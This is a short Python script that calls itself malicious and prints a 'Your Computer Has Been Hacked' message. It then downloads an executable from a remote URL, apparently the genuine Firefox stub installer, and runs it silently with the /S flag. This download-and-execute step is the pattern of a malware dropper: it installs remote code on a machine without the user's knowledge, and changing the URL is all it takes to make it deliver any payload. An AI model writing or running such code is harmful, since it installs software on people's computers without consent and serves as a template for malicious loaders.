import requests
import subprocess

print("I am a malicious program.")
print("Your Computer Has Been Hacked !")

# URL of the installer
url = "https://cdn.stubdownloader.services.mozilla.com/builds/firefox-stub/en-US/win/ec8d2f682e9d9245c887e0484c2ec7ff4b8ef69f83eead151ada4efdefa950c5/Firefox%20Installer.exe"

# Download the file
response = requests.get(url)
installer_path = "Firefox_Installer.exe"

with open(installer_path, "wb") as file:
    file.write(response.content)

# Run the installer with silent installation parameters
subprocess.run([installer_path, "/S"])


